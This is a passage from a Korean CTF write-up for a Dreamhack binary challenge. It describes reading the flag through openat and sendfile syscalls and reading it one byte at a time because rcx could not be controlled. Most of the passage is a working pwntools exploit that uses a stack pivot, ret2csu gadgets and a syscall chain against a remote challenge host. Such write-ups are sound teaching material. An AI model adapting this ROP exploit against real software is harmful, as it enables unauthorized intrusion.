`openat`이랑 `sendfile` 쓰면 된다. 필자는 `sigreturn` 쓰는 게 너무 귀찮고 왠지 안 써도 될 거 같아서 그냥 진행했다. 다른 건 다 문제가 없었는데 `sendfile`의 네 번째 인자(`rcx`)를 조작할 수 없는 게 문제였다. `혹시 어떤 값이 들어있지 않을까?`라고 믿고 해봤는데 1바이트씩 출력되었다. 그래서 offset 조절하면서 읽어왔다. `rcx`가 0이었으면 `sigreturn` 썼어야 했는데 매우 다행이었다.

# exploit

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'debug'

flag = b""
for i in range(0x30):
    #p = process('./chall')
    p = remote('host3.dreamhack.games', 23054)
    e = ELF('./chall')
    bss = e.bss() + 0x500
    csu1 = 0x40145A
    csu2 = 0x401440
    leave_ret = 0x00000000004013b5
    syscall = 0x00000000004013f5
    pop_rbp = 0x000000000040119d
    ret = 0x40101a

    payload = b'a' * 0x10 + p64(bss) + p64(0x4013d3) + p64(bss) + p64(leave_ret)
    p.send(payload)

    sleep(0.5)
    payload = b'./flag\x00\x00' + p64(syscall) + p64(ret)
    payload += p64(csu1) + p64(0) + p64(1) + p64(-100 & ((1 << 64) - 1)) + p64(bss - 0x10) + p64(0) + p64(bss - 0x8) + p64(csu2)
    payload += p64(csu1) + p64(0) + p64(bss) + p64(1) + p64(5) + p64(bss - 0x10) + p64(bss - 8) + p64(0x4013d3) + p64(bss) + p64(leave_ret)
    payload = payload.ljust(0x101, b'\x00')
    p.send(payload)

    sleep(0.5)
    payload = p64(i) + p64(syscall) + p64(ret) + p64(csu2) + p64(ret)
    p.send(payload)
    try:
        flag += p.recvn(1)
    except:
        p.close()
        break
    print(flag.decode())
    p.close()
print(flag.decode())
```